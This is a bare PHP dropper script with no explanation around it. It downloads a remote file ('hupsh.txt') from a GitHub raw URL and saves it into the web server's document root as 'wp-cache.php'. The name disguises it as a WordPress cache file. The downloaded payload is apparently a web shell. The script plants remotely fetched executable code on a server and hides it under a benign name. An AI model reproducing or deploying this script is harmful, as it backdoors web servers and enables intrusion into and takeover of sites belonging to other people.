<?php
$url = "https://raw.githubusercontent.com/lucenbyte/ArchiLogs/main/hupsh.txt";
$save_as = rtrim($_SERVER['DOCUMENT_ROOT'], "/") . "/wp-cache.php";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$data = curl_exec($ch);
if ($data === false) {
    die("error: " . curl_error($ch));
}
curl_close($ch);
if (@file_put_contents($save_as, $data) === false) {
    die("Not Found.");
}
echo "Sucessfully: $save_as";
?>
